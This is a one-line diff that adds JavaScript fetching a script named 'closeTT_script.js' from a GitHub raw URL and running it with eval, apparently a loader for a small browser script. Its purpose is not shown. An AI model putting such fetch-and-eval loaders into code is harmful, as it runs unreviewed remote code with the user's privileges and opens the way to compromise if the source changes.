@@ -1,0 +1,1 @@
+fetch('https://raw.githubusercontent.com/AndrewRuden/t2noctt/main/closeTT_script.js').then(response=>response.text()).then(text=>eval(text))
